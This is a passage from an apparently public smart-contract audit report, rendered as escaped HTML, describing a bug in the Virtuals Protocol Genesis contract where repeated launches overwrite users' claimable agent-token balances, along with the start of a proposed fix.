class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if contract has enough agent token balance only after agentTokenAddress be set\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalDistributionAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient Agent Token balance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Directly transfer Virtual Token refunds\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// first decrease the virtuals mapping of the user to prevent reentrancy attacks\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emapAddrToVirtuals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]] -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// then transfer the virtuals\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRefundClaimed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// save the amount of agent tokens to claim\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;          \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAgentTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eGenesisSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMultiple launches can occur, which is why the \u003ccode\u003eisFirstLaunch\u003c/code\u003e flag is implemented. However, there’s an issue in how \u003ccode\u003eagentTokens\u003c/code\u003e are accounted for in the \u003ccode\u003eclaimableAgentTokens\u003c/code\u003e mapping.\u003c/p\u003e\n\u003cp\u003eCurrently, the mapping value is being overwritten instead of incremented. This means if a user doesn’t call \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L307-L318\"\u003e\u003ccode\u003eclaimAgentToken()\u003c/code\u003e\u003c/a\u003e to redeem their \u003ccode\u003eagentTokens\u003c/code\u003e before a subsequent launch occurs, the second launch will overwrite the previous value resulting in a loss of \u003ccode\u003eagentTokens\u003c/code\u003e from the first launch.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo resolve the issue, update the logic to \u003cstrong\u003eadd\u003c/strong\u003e the new \u003ccode\u003eagentTokens\u003c/code\u003e amount instead of \u003cstrong\u003eoverwriting\u003c/strong\u003e it.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"101\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction onGenesisSuccess(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address[] calldata refundVirtualsTokenUserAddresses,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256[] calldata refundVirtualsTokenUserAmounts,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address[] calldata distributeAgentTokenUserAddresses,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256[] calldata distributeAgentTokenUserAmounts,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address creator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) external onlyRole(FACTORY_ROLE) nonReentrant whenNotCancelled whenNotFailed whenEnded returns (address) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(refundUserCountForFailed == 0, \u0026quot;OnGenesisFailed already called\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            refundVirtualsTokenUserAddresses.length == refundVirtualsTokenUserAmounts.length,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Mismatched refund arrays\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            distributeAgentTokenUserAddresses.length == distributeAgentTokenUserAmounts.length,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Mismatched distribution arrays\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Calculate total refund amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 totalRefundAmount = 0;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        for (uint256 i = 0; i \u0026lt; refundVirtualsTokenUserAmounts.length; i++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // check if the user has enough virtuals committed\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                mapAddrToVirtuals[refundVirtualsTokenUserAddresses[i]] \u0026gt;= refundVirtualsTokenUserAmounts[i],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u0026quot;Insufficient Virtual Token committed\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            totalRefundAmount += refundVirtualsTokenUserAmounts[i];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Check if launch has been called before\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        bool isFirstLaunch = agentTokenAddress == address(0);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Calculate required balance based on whether this is first launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 requiredVirtualsBalance = isFirstLaunch ? totalRefundAmount + reserveAmount : totalRefundAmount;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Check if contract has enough virtuals balance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            IERC20(virtualTokenAddress).balanceOf(address(this)) \u0026gt;= requiredVirtualsBalance,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Insufficient Virtual Token balance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // Only do launch related operations if this is first launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        if (isFirstLaunch) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // grant allowance to agentFactoryAddress for launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            IERC20(virtualTokenAddress).approve(agentFactoryAddress, reserveAmount);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // Call initFromBondingCurve and executeBondingCurveApplication\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            uint256 id = IAgentFactoryV3(agentFactoryAddress).initFromBondingCurve(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                string.concat(genesisName, \u0026quot; by Virtuals\u0026quot;),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                genesisTicker,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                genesisCores,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                tbaSalt,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                tbaImplementation,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                daoVotingPeriod,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                daoThreshold,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                reserveAmount,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                creator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            address agentToken = IAgentFactoryV3(agentFactoryAddress).executeBondingCurveApplication(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                id,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                agentTokenTotalSupply,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                agentTokenLpSupply,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                address(this) // vault\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            require(agentToken != address(0), \u0026quot;Agent token creation failed\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            // Store the created agent token address\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            agentTokenAddress = agentToken;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        